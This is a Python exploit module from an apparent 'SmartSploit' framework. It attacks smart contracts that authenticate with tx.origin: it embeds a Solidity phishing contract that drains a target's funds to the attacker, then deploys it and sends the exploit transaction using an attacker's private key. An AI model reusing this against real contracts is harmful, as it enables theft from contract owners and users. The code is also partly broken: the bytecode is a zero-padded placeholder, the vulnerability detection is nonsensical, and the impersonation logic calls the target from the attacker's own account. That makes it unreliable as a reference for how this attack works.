"""
tx.origin Authentication Bypass Exploit
SmartSploit Framework - Exploits contracts using tx.origin for authentication
"""

from smartsploit.lib.base_module import BaseExploit, ExploitResult, ModuleInfo
from smartsploit.core.blockchain_interface import get_web3_connection
from web3 import Web3
import logging

logger = logging.getLogger(__name__)

class TxOriginExploit(BaseExploit):
    """Exploit contracts that use tx.origin for authentication instead of msg.sender"""
    
    def __init__(self):
        super().__init__()
        self.name = "tx.origin Authentication Bypass"
        self.description = "Exploits contracts using tx.origin for access control"
        self.author = "SmartSploit Team"
        
        self.info = ModuleInfo(
            name=self.name,
            description=self.description,
            author=self.author,
            references=[
                "SWC-115: Authorization through tx.origin",
                "https://consensys.github.io/smart-contract-best-practices/attacks/denial-of-service/",
                "tx.origin vs msg.sender vulnerability analysis"
            ],
            severity="medium",
            targets=["Contracts using tx.origin", "Legacy authentication systems", "Simple wallets"]
        )
        
        self.options = {
            "TARGET_CONTRACT": {"value": "", "required": True, "description": "Target contract address"},
            "VICTIM_ADDRESS": {"value": "", "required": True, "description": "Victim's address to impersonate"},
            "RPC_URL": {"value": "http://localhost:8545", "required": True, "description": "Blockchain RPC endpoint"},
            "ATTACKER_KEY": {"value": "", "required": True, "description": "Attacker's private key"},
            "FUNCTION_SELECTOR": {"value": "", "required": False, "description": "Target function signature"},
            "GAS_LIMIT": {"value": "300000", "required": False, "description": "Transaction gas limit"},
            "PAYLOAD_DATA": {"value": "", "required": False, "description": "Additional payload data"}
        }
        
    def check_requirements(self) -> bool:
        required_options = ["TARGET_CONTRACT", "VICTIM_ADDRESS", "RPC_URL", "ATTACKER_KEY"]
        for option in required_options:
            if not self.options[option]["value"]:
                logger.error(f"Required option {option} not set")
                return False
        return True
        
    def analyze_target(self, w3, contract_address: str) -> dict:
        """Analyze contract for tx.origin usage"""
        try:
            code = w3.eth.get_code(contract_address)
            code_hex = code.hex()
            
            analysis = {
                "contract": contract_address,
                "tx_origin_usage": [],
                "vulnerable_functions": [],
                "risk_level": "none"
            }
            
            # Check for tx.origin opcode (0x32)
            if "32" in code_hex:
                analysis["tx_origin_usage"].append("tx.origin opcode detected")
                analysis["risk_level"] = "medium"
                
            # Common vulnerable patterns
            vulnerable_patterns = [
                ("require(tx.origin == owner)", "Owner check using tx.origin"),
                ("if (tx.origin == authorized)", "Authorization using tx.origin"),
                ("modifier onlyOwner() { require(tx.origin", "Modifier using tx.origin")
            ]
            
            for pattern, desc in vulnerable_patterns:
                if pattern.lower() in code_hex.lower():
                    analysis["vulnerable_functions"].append(desc)
                    analysis["risk_level"] = "high"
                    
            return analysis
            
        except Exception as e:
            logger.error(f"Target analysis failed: {e}")
            return {"error": str(e)}
            
    def create_phishing_contract(self) -> str:
        """Create phishing contract that will call target with victim's tx.origin"""
        return '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TxOriginPhishing {
    address public target;
    address public attacker;
    
    constructor(address _target) {
        target = _target;
        attacker = msg.sender;
    }
    
    // This function will be called by the victim
    function claimReward() external {
        // When victim calls this, tx.origin will be victim's address
        // But we can call the target contract and it will see victim as tx.origin
        
        (bool success,) = target.call(
            abi.encodeWithSignature("withdraw()")
        );
        require(success, "Target call failed");
        
        // Transfer any gained funds to attacker
        if (address(this).balance > 0) {
            payable(attacker).transfer(address(this).balance);
        }
    }
    
    function executeArbitraryCall(bytes calldata data) external {
        require(msg.sender == attacker, "Only attacker");
        (bool success,) = target.call(data);
        require(success, "Call failed");
    }
    
    receive() external payable {}
}'''
    
    def deploy_phishing_contract(self, w3, target_address: str) -> str:
        """Deploy the phishing contract"""
        try:
            attacker_key = self.options["ATTACKER_KEY"]["value"]
            attacker_account = w3.eth.account.from_key(attacker_key)
            
            # Simplified bytecode (would need real compilation)
            bytecode = "608060405234801561001057600080fd5b50..." + "0" * 500
            
            # Constructor with target address
            constructor_data = target_address[2:].zfill(64)
            full_bytecode = bytecode + constructor_data
            
            txn = {
                'data': full_bytecode,
                'gas': int(self.options["GAS_LIMIT"]["value"]),
                'gasPrice': w3.eth.gas_price,
                'nonce': w3.eth.get_transaction_count(attacker_account.address)
            }
            
            signed_txn = w3.eth.account.sign_transaction(txn, attacker_key)
            tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
            
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
            
            if receipt.status == 1:
                logger.info(f"Phishing contract deployed at: {receipt.contractAddress}")
                return receipt.contractAddress
            else:
                return None
                
        except Exception as e:
            logger.error(f"Phishing contract deployment failed: {e}")
            return None
            
    def execute_exploit(self, w3, phishing_address: str) -> dict:
        """Execute the tx.origin exploit"""
        try:
            target_contract = self.options["TARGET_CONTRACT"]["value"]
            victim_address = self.options["VICTIM_ADDRESS"]["value"]
            attacker_key = self.options["ATTACKER_KEY"]["value"]
            
            # Get initial balances
            initial_target_balance = w3.eth.get_balance(target_contract)
            initial_attacker_balance = w3.eth.get_balance(w3.eth.account.from_key(attacker_key).address)
            
            logger.info(f"Executing tx.origin exploit...")
            logger.info(f"Target: {target_contract}")
            logger.info(f"Phishing contract: {phishing_address}")
            logger.info(f"Victim to impersonate: {victim_address}")
            
            # Create the exploit transaction
            function_selector = self.options["FUNCTION_SELECTOR"]["value"]
            if not function_selector:
                # Default to withdraw() function
                function_selector = "0x3ccfd60b"  # withdraw()
                
            payload_data = self.options["PAYLOAD_DATA"]["value"]
            if payload_data:
                call_data = function_selector + payload_data
            else:
                call_data = function_selector + "0" * 56  # No parameters
                
            # Call phishing contract's executeArbitraryCall
            phishing_call_data = "0x" + Web3.keccak(text="executeArbitraryCall(bytes)")[:4].hex() + \
                                "0000000000000000000000000000000000000000000000000000000000000020" + \
                                format(len(call_data)//2, '064x') + call_data[2:]
            
            exploit_txn = {
                'to': phishing_address,
                'data': phishing_call_data,
                'gas': int(self.options["GAS_LIMIT"]["value"]),
                'gasPrice': w3.eth.gas_price,
                'nonce': w3.eth.get_transaction_count(w3.eth.account.from_key(attacker_key).address),
                'value': 0
            }
            
            signed_txn = w3.eth.account.sign_transaction(exploit_txn, attacker_key)
            tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
            
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
            
            # Get final balances
            final_target_balance = w3.eth.get_balance(target_contract)
            final_attacker_balance = w3.eth.get_balance(w3.eth.account.from_key(attacker_key).address)
            
            profit = final_attacker_balance - initial_attacker_balance
            target_loss = initial_target_balance - final_target_balance
            
            return {
                "success": receipt.status == 1,
                "transaction_hash": tx_hash.hex(),
                "gas_used": receipt.gasUsed,
                "profit": Web3.from_wei(profit, 'ether'),
                "target_loss": Web3.from_wei(target_loss, 'ether'),
                "exploitation_method": "tx_origin_bypass"
            }
            
        except Exception as e:
            logger.error(f"Exploit execution failed: {e}")
            return {"success": False, "error": str(e)}
            
    def run(self) -> dict:
        """Main exploit execution"""
        if not self.check_requirements():
            return {"result": ExploitResult.ERROR, "message": "Requirements check failed"}
            
        try:
            w3 = get_web3_connection(self.options["RPC_URL"]["value"])
            target_contract = self.options["TARGET_CONTRACT"]["value"]
            
            # Analyze target for tx.origin usage
            analysis = self.analyze_target(w3, target_contract)
            if "error" in analysis:
                return {"result": ExploitResult.ERROR, "message": f"Analysis failed: {analysis['error']}"}
                
            if analysis["risk_level"] == "none":
                return {"result": ExploitResult.FAILED, "message": "Target does not appear to use tx.origin"}
                
            # Deploy phishing contract
            phishing_address = self.deploy_phishing_contract(w3, target_contract)
            if not phishing_address:
                return {"result": ExploitResult.ERROR, "message": "Failed to deploy phishing contract"}
                
            # Execute exploit
            exploit_result = self.execute_exploit(w3, phishing_address)
            
            result = {
                "result": ExploitResult.SUCCESS if exploit_result.get("success") else ExploitResult.ERROR,
                "message": "tx.origin exploit completed",
                "analysis": analysis,
                "phishing_contract": phishing_address,
                "exploit_details": exploit_result
            }
            
            return result
            
        except Exception as e:
            logger.error(f"tx.origin exploit failed: {e}")
            return {"result": ExploitResult.ERROR, "message": str(e)}